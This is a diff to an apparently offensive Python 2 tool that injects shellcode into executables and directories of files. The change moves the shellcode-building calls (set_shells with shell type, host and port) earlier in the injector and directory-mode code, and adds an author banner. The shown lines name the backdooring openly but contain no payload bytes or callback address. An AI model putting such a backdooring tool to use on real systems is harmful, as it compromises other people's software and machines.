@@ -47,7 +47,6 @@ def signal_handler(signal, frame):
         print '\nProgram Exit'
         sys.exit(0)
 
-
 #Different Machine Types
 MachineTypes = {'0x0': 'AnyMachineType', '0x1d3': 'Matsushita AM33',
                 '0x8664': 'x64', '0x1c0': 'ARM LE', '0x1c4': 'ARMv7',
@@ -61,6 +60,11 @@ MachineTypes = {'0x0': 'AnyMachineType', '0x1d3': 'Matsushita AM33',
                 '0x1c2': 'ARM or Thumb -interworking',
                 '0x169': 'MIPS little-endian WCE v2'
                 }
+
+author = """\
+         Author: Joshua Pitts
+         Email: the.midnite.runr[a t]gmail<d o t>com
+         """
 
 menu = ["-.(`-')  (`-')  _           <-"
         ".(`-') _(`-')                            (`-')\n"
@@ -1368,6 +1372,7 @@ def injector(suffix, change_Access, SHELL, encoder, host,
                        'service to kill', restart=True/False],
                        }
     """
+    shellcode = set_shells(SHELL, port, host)
     kill = False
 
     #add putty
@@ -1530,7 +1535,6 @@ def injector(suffix, change_Access, SHELL, encoder, host,
         time.sleep(1)
         #backdoor the targets here:
         output_file = output_options(target, target+'.bd')
-        shellcode = set_shells(SHELL, port, host)
         print "Backdooring:", target
         result = do_thebackdoor(target, output_file, shellcode,
                                 nsection, add_section, encoder)
@@ -1568,6 +1572,7 @@ def injector(suffix, change_Access, SHELL, encoder, host,
 
 if __name__ == "__main__":
     print choice(menu)
+    print author
     time.sleep(1)
 
     signal.signal(signal.SIGINT, signal_handler)
@@ -1659,6 +1664,10 @@ if __name__ == "__main__":
         sys.exit()
 
     if options.DIR:
+        shellcode = set_shells(options.SHELL,
+                               options.PORT,
+                               options.HOST)
+
         dirlisting = os.listdir(options.DIR)
         print ("You are going to backdoor the following "
                "items in the %s directory:"
@@ -1674,9 +1683,6 @@ if __name__ == "__main__":
                 print ("backdooring file %s" % item)
                 try:
                     output_file = output_options(options.FILE, options.OUTPUT)
-                    shellcode = set_shells(options.SHELL,
-                                           options.PORT,
-                                           options.HOST)
                     result = do_thebackdoor(options.FILE,
                                             output_file,
                                             shellcode,
